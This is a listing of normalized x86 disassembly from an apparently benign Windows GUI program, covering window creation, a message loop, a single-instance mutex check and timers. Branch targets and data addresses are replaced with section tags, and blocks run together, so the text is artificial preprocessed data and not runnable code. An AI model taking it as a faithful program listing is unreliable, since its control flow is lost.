call [ ChangeDisplaySettingsA@IAT ]
mov edi [ esp + 0x10950 ]
push edi
call sub_466150
mov ebp [ esp + 0x10960 ]
add esp 0x4
mov ebp [ esp + 0x1095c ]
mov al [ ebp + 0x94 ]
test al al
mov ebx [ ebp + 0x48 ]
jne r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x0
push ecx
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi edi
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
push 0xffffffff
push 0x0
lea eax [ esp + 0x84 ]
push eax
call sub_401dd0
mov ebx [ esp + 0x1095c ]
mov edi 0x10
mov esi ebp
imul esi esi 0x1c
mov edi ebp
mov ecx [ rw-data ]
test ecx ecx
mov edi [ rw-data ]
jne r-xdata
mov ecx rw-data
call sub_462cf0
mov eax [ ecx + esi * 4 ]
test eax eax
je r-xdata
cmp esi eax
jge r-xdata
mov ebp [ wsprintfA@IAT ]
mov edi edi
jmp r-xdata
mov edx [ rw-data ]
push 0x0
push r--data
push r--data
push edx
call [ MessageBoxA@IAT ]
mov eax [ esp + 0x4c ]
mov ecx [ rw-data ]
mov [ ecx + ebp ] eax
mov [ esp + 0x74 ] ebx
mov [ esp + 0x70 ] 0x0
mov [ esp + 0x60 ] 0x0
push edi
lea ecx [ esp + 0x274 ]
push ecx
lea edx [ esp + 0xc0 ]
push edx
mov [ esp + 0x10954 ] 0xc
call ebp
add esp 0xc
push 0x1
lea eax [ esp + 0x60 ]
push eax
push r--data
lea ecx [ esp + 0xc4 ]
push ecx
push r--data
lea ecx [ esp + 0x948 ]
call sub_435780
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov esi edi
imul esi esi 0x70
mov eax [ esi + ecx + 0x18 ]
add esi ecx
cmp eax ebx
jb r-xdata
push esi
call sub_457f40
add esp 0x4
add esi eax
push esi
lea ecx [ esp + 0x238 ]
call sub_4024d0
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x238 ]
push ecx
lea ecx [ esp + 0x298 ]
mov [ esp + 0x10950 ] 0x9
call sub_40bcb0
push eax
lea ecx [ esp + 0x254 ]
mov [ esp + 0x1094c ] 0xa
call sub_432cd0
lea edx [ esp + 0x250 ]
push edx
lea eax [ esp + 0x60 ]
push eax
lea ecx [ esp + 0x54 ]
mov [ esp + 0x10950 ] 0xb
call sub_46bb20
lea ecx [ esp + 0x250 ]
call sub_4480e0
lea ecx [ esp + 0x290 ]
call sub_4480e0
lea ecx [ esp + 0x234 ]
mov [ esp + 0x10948 ] 0x8
call sub_4480e0
inc edi
mov ecx rw-data
mov [ esp + 0x10 ] edi
call sub_4010f0
cmp edi eax
jl r-xdata
push r--data
push esi
push edi
call sub_461b70
lea esi [ edi + 0x3 ]
mov [ esp + 0x17 ] 0x1
inc esi
push esi
push edi
call sub_401ba0
lea esi [ edi - 0x1 ]
jmp r-xdata
push 0x8
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
push 0xaf
push ebp
call esi
test [ rw-data ] 0x8
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
push 0x1
call sub_451930
add esp 0x4
mov eax [ rw-data ]
lea ecx [ esp + 0x4c ]
push ecx
mov [ esp + 0x50 ] 0x10
mov [ esp + 0x54 ] 0x2
mov [ esp + 0x58 ] eax
call [ _TrackMouseEvent@IAT ]
push esi
call [ UpdateWindow@IAT ]
mov ecx [ rw-data ]
push ecx
call [ SetFocus@IAT ]
jmp r-xdata
push 0x0
call [ ShowCursor@IAT ]
mov [ rw-data ] 0x0
mov al [ rw-data ]
test al al
mov [ rw-data ] al
mov [ rw-data ] 0x0
je r-xdata
push ebx
mov [ rw-data ] ebx
call sub_451820
add esp 0x4
mov eax [ esp + 0x64 ]
cmp eax [ rw-data ]
jge r-xdata
mov [ rw-data ] eax
jmp r-xdata
mov al [ ebp + 0x94 ]
test al al
je r-xdata
cmp eax 0xc
jge r-xdata
test ebx ebx
jge r-xdata
cmp [ ebp + 0x44 ] 0x10
mov edx [ ebp + 0x40 ]
lea ecx [ ebp + 0x4 ]
jb r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
cmp edx [ rw-data ]
jge r-xdata
push 0xffffffff
add ecx esi
push 0x0
lea edx [ ecx - 0x1c ]
push edx
call sub_401dd0
mov ecx [ rw-data ]
sub esi 0x1c
dec edi
jne r-xdata
jmp r-xdata
inc esi
jmp r-xdata
push eax
call edi
mov eax [ rw-data ]
mov [ eax + esi * 4 ] 0x0
lea ecx [ esp + 0x5c ]
call sub_4480e0
mov ecx rw-data
inc edi
call sub_4010f0
lea ecx [ edi - 0x1 ]
cmp ecx eax
jl r-xdata
lea edx [ esp + 0x5c ]
push edx
lea eax [ esp + 0x130 ]
push eax
lea ecx [ esp + 0x54 ]
call sub_432c60
mov eax [ eax ]
cmp eax [ esp + 0x50 ]
je r-xdata
push 0x8
push 0x106
push ebp
call esi
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
push 0xc3
push ebp
call esi
mov eax [ rw-data ]
test eax eax
jne r-xdata
test [ rw-data ] 0x8
jne r-xdata
mov eax [ rw-data ]
test al 0x8
mov [ rw-data ] eax
je r-xdata
push ebx
call sub_451690
add esp 0x4
mov eax [ esp + 0x60 ]
cmp eax ebx
jle r-xdata
mov [ rw-data ] eax
jmp r-xdata
mov esi [ rw-data ]
cmp esi 0x3
jb r-xdata
push rw-data
call sub_453130
mov eax [ rw-data ]
add esp 0x4
cmp eax esi
je r-xdata
push esi
push 0xffffffff
push edi
push eax
mov [ rw-data ] esi
mov [ rw-data ] esi
call sub_486df0
add esp 0x10
cmp [ ebp + 0x90 ] 0x1
jne r-xdata
xor ebx ebx
lea eax [ ebp + 0x30 ]
mov eax [ ebp + 0x30 ]
jmp r-xdata
sub edi ecx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
sub edi ecx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov esi [ eax + 0x28 ]
push edi
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0xc0 ]
push edx
call ebp
imul esi esi 0x70
mov edx [ rw-data ]
add esp 0xc
push 0x1
add esi edx
add esi 0x54
push esi
push r--data
lea eax [ esp + 0xc4 ]
push eax
push r--data
lea ecx [ esp + 0x948 ]
call sub_435780
push 0x0
push 0x106
push ebp
call esi
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
push 0x105
push ebp
call esi
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor eax 0x8
push ebx
mov [ rw-data ] eax
call sub_451770
add esp 0x4
mov eax [ esp + 0x68 ]
cmp eax [ rw-data ]
jge r-xdata
mov [ rw-data ] eax
jmp r-xdata
cmp [ ebp + 0x90 ] 0x2
mov [ rw-data ] 0x0
jne r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x7b
call sub_48a5f0
add esp 0xc
cmp esi 0x3
jne r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0xa4
call sub_48a5f0
add esp 0xc
mov eax [ rw-data ]
mov edi [ esp + 0x10950 ]
xor ecx ecx
cmp eax ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
push edx
mov edx [ ecx + 0x14 ]
push eax
push edx
push 0x0
call sub_401150
test eax eax
je r-xdata
mov esi edi
imul esi esi 0x1c
lea esp [ esp ]
lea edi [ edx - 0x1 ]
cmp edi 0x1
jl r-xdata
sub esp 0x1c
mov eax esp
inc edx
mov [ esp + 0x68 ] esp
mov [ eax + 0x18 ] 0xf
mov [ eax + 0x14 ] 0x0
push edx
mov ecx rw-data
mov [ eax + 0x4 ] 0x0
call sub_421e10
mov edi [ rw-data ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov [ rw-data ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ rw-data ]
push edx
cmp esi 0x4
jne r-xdata
mov eax [ rw-data ]
push eax
jmp r-xdata
cmp [ rw-data ] 0xc
jge r-xdata
cmp eax 0xc
jl r-xdata
call sub_45f9e0
mov eax [ rw-data ]
xor ebx ebx
xor edi edi
test eax eax
jle r-xdata
push 0xffffffff
add ecx esi
push 0x0
lea edx [ ecx - 0x1c ]
push edx
call sub_401dd0
mov ecx [ rw-data ]
sub esi 0x1c
dec edi
jne r-xdata
mov eax [ rw-data ]
push eax
mov [ rw-data ] eax
call [ UpdateWindow@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x84
call sub_48a5f0
add esp 0xc
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x6f
jmp r-xdata
push 0x1
push 0x6d
cmp ebx 0x7fffff
mov [ rw-data ] ecx
je r-xdata
mov [ rw-data ] ecx
mov ecx [ rw-data ]
test ecx ecx
jle r-xdata
xor esi esi
mov al [ ebp + 0x94 ]
test al al
jne r-xdata
push 0x0
push 0x0
push 0x414
push eax
call [ SendMessageA@IAT ]
call sub_48a5f0
add esp 0xc
mov esi [ rw-data ]
push 0x1
push 0x0
push ebx
push edi
mov [ rw-data ] 0x0
call sub_485220
mov eax [ rw-data ]
add esp 0x10
mov [ rw-data ] esi
mov eax [ rw-data ]
dec eax
cmp ebx eax
jl r-xdata
xor esi esi
cmp eax esi
je r-xdata
cmp [ rw-data ] 0x136
je r-xdata
lea eax [ ebp + 0x30 ]
mov eax [ ebp + 0x30 ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
mov esi [ PostMessageA@IAT ]
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ebx eax
mov eax [ rw-data ]
push sub_45ba40
push 0x7d0
push 0x3
push eax
mov [ rw-data ] 0x1
call [ SetTimer@IAT ]
mov [ rw-data ] eax
jmp r-xdata
mov ebx edi
jmp r-xdata
mov eax [ rw-data ]
inc edi
add esi 0x70
cmp edi eax
jl r-xdata
push edx
mov edx [ ecx + 0x14 ]
push eax
push edx
push 0x0
call sub_401150
test eax eax
je r-xdata
cmp [ ebp + 0x51 ] 0x1
jne r-xdata
push 0x1
push eax
call [ EnableWindow@IAT ]
movzx edx [ rw-data ]
mov eax [ rw-data ]
shl edx 0x10
or edx 0x1
push edx
push 0x1
push 0x406
push eax
call esi
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
mov edx [ ebp + 0x40 ]
lea ecx [ esi + eax ]
cmp [ ebp + 0x44 ] 0x10
jb r-xdata
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8c ]
test eax eax
je r-xdata
mov al [ ebp + 0x50 ]
test al al
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov edx [ ebp + 0x4c ]
push edx
lea ecx [ eax + 0xe0 ]
call sub_421150
mov ecx [ ebp + 0x24 ]
push ecx
push eax
push 0x0
call sub_423720
add esp 0xc
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp [ esp + 0x94 ] 0x10
jb r-xdata
push 0x0
push 0xf5
push 0x111
push edi
mov [ rw-data ] 0x0
call esi
mov eax rw-data
lea edx [ eax + 0x1 ]
mov [ esp + 0x94 ] 0xf
mov [ esp + 0x90 ] 0x0
mov [ esp + 0x80 ] 0x0
mov ecx rw-data
jmp r-xdata
mov eax [ esp + 0x80 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ rw-data ]
sub eax edx
push eax
push rw-data
push ecx
push 0x0
mov ecx rw-data
call sub_401150
test eax eax
je r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
push eax
push rw-data
call [ lstrcpyA@IAT ]
push 0x0
push rw-data
call sub_42dee0
add esp 0x8
mov eax rw-data
sub_4a3700
sub esp 0x94
push ebx
push esi
mov esi [ LoadIconA@IAT ]
push edi
mov edi [ esp + 0xa4 ]
push 0x6e
xor ebx ebx
push edi
mov [ esp + 0x70 ] edi
mov [ esp + 0x84 ] r--data
mov [ esp + 0x60 ] ebx
mov [ esp + 0x5c ] 0x30
call esi
push 0x10c
push edi
mov [ esp + 0x74 ] eax
call esi
push 0x7f00
push ebx
mov [ esp + 0x88 ] eax
call [ LoadCursorA@IAT ]
mov [ esp + 0x70 ] eax
lea eax [ esp + 0x54 ]
push eax
mov [ esp + 0x7c ] 0x66
mov [ esp + 0x64 ] ebx
mov [ esp + 0x68 ] ebx
mov [ esp + 0x78 ] ebx
mov [ esp + 0x60 ] sub_49d1a0
call [ RegisterClassExA@IAT ]
test ax ax
jne r-xdata
push ebp
push 0x104
push rw-data
push ebx
call [ GetModuleFileNameA@IAT ]
push rw-data
call sub_457f40
add esp 0x4
push r--data
push rw-data
mov [ eax + rw-data ] 0x0
call [ lstrcatA@IAT ]
push 0x8000
call j_sub_4b573e#2
mov ebp eax
add esp 0x4
cmp ebp ebx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x94
retn 0x10
pop ebp
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x94
retn 0x10
mov eax [ esp + 0xb0 ]
or edi 0xffffffff
cmp eax ebx
mov [ ebp ] 0x0
mov [ esp + 0x12 ] 0x0
mov [ esp + 0x13 ] 0x0
mov [ esp + 0x2c ] edi
mov [ esp + 0x18 ] edi
mov [ esp + 0x14 ] ebx
je r-xdata
mov esi 0x1
push esi
push rw-data
push ebx
call sub_47b1d0
add esp 0xc
cmp edi 0xffffffff
je r-xdata
cmp [ eax ] 0x0
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x1c ]
push edx
lea ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x1f ]
push edx
lea ecx [ esp + 0x22 ]
push ecx
push ebp
push eax
call sub_4582e0
mov edi [ esp + 0x48 ]
add esp 0x1c
cmp [ rw-data ] ebx
je r-xdata
push r--data
push esi
push ebx
call [ CreateMutexA@IAT ]
mov [ rw-data ] eax
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
cmp edi esi
mov [ rw-data ] ebx
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
push 0x1
push 0x2cf0000
lea eax [ esp + 0x24 ]
add edx 0x14
push eax
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ecx
mov [ esp + 0x34 ] edx
call [ AdjustWindowRect@IAT ]
mov esi [ rw-data ]
mov edi [ rw-data ]
mov edx [ rw-data ]
mov eax [ rw-data ]
mov esi [ rw-data ]
mov ecx [ rw-data ]
mov edi edx
or edi eax
or edi esi
or edi ecx
je r-xdata
push 0x5
call [ GetDesktopWindow@IAT ]
mov ebx [ GetWindow@IAT ]
push eax
call ebx
mov esi eax
test esi esi
je r-xdata
cmp edi 0x2
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
push ebx
push esi
mov [ rw-data ] esi
call [ ShowWindow@IAT ]
mov al [ rw-data ]
test al al
mov edi [ SendMessageA@IAT ]
jne r-xdata
mov [ esp + 0x20 ] eax
mov edi eax
mov eax [ rw-data ]
cmp eax 0x2
mov [ esp + 0x24 ] esi
mov [ esp + 0x1c ] ecx
mov [ esp + 0x28 ] edx
mov esi ecx
jne r-xdata
push r--data
push esi
call [ GetPropA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] edi
push 0x0
push 0x77
push 0x111
push esi
mov [ rw-data ] 0x0
call edi
mov al [ esp + 0x12 ]
test al al
je r-xdata
cmp eax 0x1
jne r-xdata
mov ebx 0x3
jmp r-xdata
push 0x2
push esi
call ebx
mov esi eax
test esi esi
jne r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
mov bl 0x1
jne r-xdata
push 0x1
push r--data
push esi
call [ SetPropA@IAT ]
push esi
call [ UpdateWindow@IAT ]
push 0x1
call [ timeBeginPeriod@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ebx [ esp + 0xb4 ]
mov ebx 0x6
jmp r-xdata
push 0x0
call [ OleInitialize@IAT ]
mov ecx [ esp + 0xa8 ]
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
push 0x0
push ecx
mov ecx [ esp + 0x28 ]
push 0x0
push 0x0
sub edx ecx
mov ecx [ esp + 0x2c ]
push edx
sub eax ecx
push eax
push edi
push esi
push 0x2cf0000
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov esi eax
test esi esi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
add esp 0x94
retn 0x10
cmp [ ebp ] 0x0
jne r-xdata
push esi
call [ IsIconic@IAT ]
test eax eax
je r-xdata
push rw-data
lea ecx [ esp + 0x8c ]
call sub_4024d0
cmp [ ebp ] 0x0
je r-xdata
mov bl [ esp + 0x13 ]
push ebp
mov [ esp + 0x34 ] 0x1
call [ lstrlenA@IAT ]
inc eax
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] ebp
mov [ eax + ebp ] edi
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x18 ]
mov [ edx + ebp + 0x4 ] eax
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x30 ]
push eax
mov [ ecx + ebp + 0x8 ] edx
mov ebx [ esp + 0x38 ]
push 0x0
push 0x4a
add ebx 0xc
push esi
mov [ esp + 0x44 ] ebx
call [ SendMessageA@IAT ]
push esi
call [ GetLastActivePopup@IAT ]
push eax
call [ SetForegroundWindow@IAT ]
push 0x9
push esi
call [ ShowWindow@IAT ]
test bl bl
je r-xdata
mov eax [ esp + 0x18 ]
cmp eax 0x4
mov esi [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
push 0x0
push 0x56ce
push 0x111
push esi
call edi
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
push ebp
call sub_464fe0
add esp 0x4
jmp r-xdata
push ebp
call j_sub_4b66ed
mov edi [ GetMessageA@IAT ]
add esp 0x4
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x48 ]
push eax
call edi
test eax eax
je r-xdata
push 0x1
push rw-data
call sub_42dee0
add esp 0x8
lea edx [ esp + 0x88 ]
push rw-data
push edx
call sub_401380
add esp 0x8
test al al
jmp r-xdata
push 0x1
push 0xffffffff
push ebp
call sub_425d10
add esp 0xc
mov [ rw-data ] eax
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] esi
je r-xdata
push 0x1
call [ timeEndPeriod@IAT ]
call [ OleUninitialize@IAT ]
mov esi [ esp + 0x44 ]
lea ecx [ esp + 0x88 ]
call sub_4480e0
pop ebp
pop edi
mov eax esi
pop esi
pop ebx
add esp 0x94
retn 0x10
mov esi [ IsDialogMessageA@IAT ]
mov ebx [ TranslateMessage@IAT ]
mov ebp [ DispatchMessageA@IAT ]
je r-xdata
lea ecx [ esp + 0x88 ]
push rw-data
push ecx
call sub_401380
add esp 0x8
test al al
jmp r-xdata
lea edx [ esp + 0x3c ]
push edx
call sub_40baa0
add esp 0x4
test eax eax
jne r-xdata
lea ecx [ esp + 0x3c ]
push ecx
push eax
call esi
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x0
lea edx [ esp + 0x48 ]
push edx
call edi
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
lea ecx [ esp + 0x3c ]
push ecx
push eax
call esi
test eax eax
jne r-xdata
lea eax [ esp + 0x3c ]
push eax
call ebx
lea ecx [ esp + 0x3c ]
push ecx
call ebp
lea edx [ esp + 0x3c ]
push edx
push eax
call esi
test eax eax
jne r-xdata
sub_4a3c60
sub esp 0x8
mov edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
add eax edx
mov edx [ ecx + 0x8 ]
mov [ esp ] eax
dec eax
cmp edx eax
ja r-xdata
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax * 4 ]
add esp 0x8
retn
mov ecx [ ecx + 0x4 ]
sub eax edx
mov eax [ ecx + eax * 4 ]
add esp 0x8
retn
sub_4a3ca0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c1808
push eax
mov [ fs : 0x0 ] esp
mov ecx [ rw-data ]
push 0xffffffff
push 0x0
lea eax [ esp + 0x18 ]
push eax
mov [ esp + 0x14 ] 0x0
call sub_4018c0
cmp [ esp + 0x28 ] 0x10
jb r-xdata
mov ecx [ esp ]
mov [ fs : 0x0 ] ecx
add esp 0xc
retn 0x1c
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
sub_4a3d00
mov eax [ esp + 0x4 ]
sub esp 0x10
push eax
lea ecx [ esp + 0x4 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
lea eax [ esp + 0xc ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ rw-data ]
sub eax edx
push eax
lea edx [ esp + 0x4 ]
push edx
call sub_401cc0
add esp 0x10
retn 0x4
sub_4a3d50
push 0xffffffff
push sub_4c1828
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov edi [ esp + 0x20 ]
mov esi ecx
xor ebx ebx
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push edi
mov [ esp + 0x18 ] esi
mov [ esi + 0x4 ] bl
call sub_401dd0
push 0xffffffff
lea ecx [ esi + 0x1c ]
push ebx
add edi 0x1c
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] ebx
push edi
mov [ esp + 0x24 ] ebx
mov [ ecx + 0x4 ] bl
call sub_401dd0
mov ecx [ esp + 0x10 ]
pop edi
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4a3dd0
push 0xffffffff
push sub_4c1848
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
movsx eax [ esp + 0x34 ]
push ebx
xor ebx ebx
push esi
mov esi 0xf
cmp esi 0x10
mov [ esp + 0x10 ] bl
mov ah al
mov [ esp + 0x10 ] al
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] ebx
mov [ esp + 0x24 ] esi
mov [ esp + 0x20 ] 0x1
jae r-xdata
mov [ eax + 0x1 ] bl
mov edx [ esp + 0x40 ]
push 0xffffffff
push ebx
push edx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x3c ] ebx
call sub_4018c0
mov esi [ esp + 0x38 ]
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push eax
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_401dd0
cmp [ esp + 0x24 ] 0x10
jb r-xdata
lea eax [ esp + 0x10 ]
mov ecx [ esp + 0x28 ]
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
mov eax [ esp + 0x10 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4a3e80
push esi
push edi
mov edi ecx
mov ecx [ esp + 0xc ]
mov eax r--data
mov [ rw-data ] ecx
lea esi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
push eax
push r--data
call sub_401e80
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx rw-data
call sub_401e80
mov eax edi
pop edi
mov [ rw-data ] 0x0
pop esi
retn 0x4
sub_4a3f10
push 0xffffffff
push sub_4c1888
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
mov esi ecx
push edi
mov [ esp + 0xc ] esi
xor ebx ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esp + 0x6c ] ebx
mov [ esi + 0x4 ] bl
push 0xffffffff
push ebx
lea eax [ esp + 0x7c ]
push eax
mov [ esp + 0x78 ] 0x1
call sub_401dd0
cmp [ rw-data ] bl
je r-xdata
mov [ rw-data ] 0x1
mov eax r--data
lea edx [ eax + 0x1 ]
cmp [ esp + 0x44 ] edi
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
jb r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
mov ecx [ rw-data ]
sub eax edx
push eax
push r--data
call sub_401cc0
jmp r-xdata
cmp [ esp + 0x60 ] edi
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] ebx
mov [ esp + 0x30 ] bl
mov [ esp + 0x6c ] 0x1
jb r-xdata
mov edx [ esp + 0x30 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push r--data
lea ecx [ esp + 0x4c ]
push rw-data
push ecx
call sub_402140
push esi
push eax
lea edx [ esp + 0x40 ]
push edx
mov [ esp + 0x84 ] 0x2
call sub_420e80
push r--data
push eax
lea eax [ esp + 0x30 ]
push eax
mov [ esp + 0x90 ] 0x3
call sub_402140
add esp 0x24
mov ecx [ rw-data ]
push 0xffffffff
push ebx
push eax
mov [ esp + 0x78 ] 0x4
call sub_4018c0
mov eax [ esp + 0x28 ]
mov edi 0x10
cmp eax edi
jb r-xdata
push 0x9
push 0x1
mov ecx rw-data
call sub_4017f0
cmp [ esp + 0x8c ] edi
jb r-xdata
mov eax [ esp + 0x4c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x64 ]
pop edi
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x64
retn 0x1c
mov ecx [ esp + 0x78 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
sub_4a4080
push 0xffffffff
push sub_4c18d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x70
push ebx
push esi
push edi
mov ecx [ rw-data ]
mov edx [ ecx + 0x14 ]
lea eax [ edx - 0x1 ]
xor ebx ebx
cmp eax edx
mov [ esp + 0x84 ] 0x1
ja r-xdata
push ebx
sub eax edx
push eax
call sub_4017f0
push 0xffffffff
push eax
call sub_401ba0
jmp r-xdata
cmp [ esp + 0x40 ] esi
mov edi 0xf
mov [ esp + 0x24 ] edi
mov [ esp + 0x20 ] ebx
mov [ esp + 0x10 ] bl
jb r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
lea eax [ esp + 0x8c ]
push eax
lea ecx [ esp + 0x64 ]
push 0x20
push ecx
call sub_4a3dd0
push r--data
push eax
lea edx [ esp + 0x58 ]
push edx
mov [ esp + 0x9c ] 0x2
call sub_402140
lea ecx [ esp + 0xc0 ]
push ecx
push eax
lea edx [ esp + 0x48 ]
push edx
mov [ esp + 0xa8 ] 0x3
call sub_420e80
push r--data
push eax
lea eax [ esp + 0x38 ]
push eax
mov [ esp + 0xb4 ] 0x4
call sub_402140
add esp 0x30
mov ecx [ rw-data ]
push 0xffffffff
push ebx
push eax
mov [ esp + 0x90 ] 0x5
call sub_4018c0
mov eax [ esp + 0x24 ]
mov esi 0x10
cmp eax esi
jb r-xdata
cmp [ esp + 0x5c ] esi
mov [ esp + 0x40 ] edi
mov [ esp + 0x3c ] ebx
mov [ esp + 0x2c ] bl
jb r-xdata
mov edx [ esp + 0x2c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x78 ] esi
mov [ esp + 0x5c ] edi
mov [ esp + 0x58 ] ebx
mov [ esp + 0x48 ] bl
jb r-xdata
mov eax [ esp + 0x48 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0xa4 ] esi
jb r-xdata
mov ecx [ esp + 0x64 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0xc0 ]
mov [ esp + 0xa4 ] edi
pop edi
cmp eax esi
pop esi
mov [ esp + 0x98 ] ebx
mov [ esp + 0x88 ] bl
pop ebx
jb r-xdata
mov edx [ esp + 0x90 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
add esp 0x7c
retn 0x38
mov eax [ esp + 0xa0 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4a4220
mov ecx [ esp + 0x8 ]
sub esp 0x304
push esi
lea eax [ esp + 0x314 ]
push eax
push ecx
lea edx [ esp + 0x110 ]
push edx
call sub_4b68d6
mov esi [ esp + 0x318 ]
mov eax [ esi + 0x4 ]
push eax
lea ecx [ esp + 0x18 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
lea eax [ esp + 0x20 ]
add esp 0x18
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
add esi 0x1003c
push eax
lea edx [ esp + 0xc ]
push edx
mov ecx esi
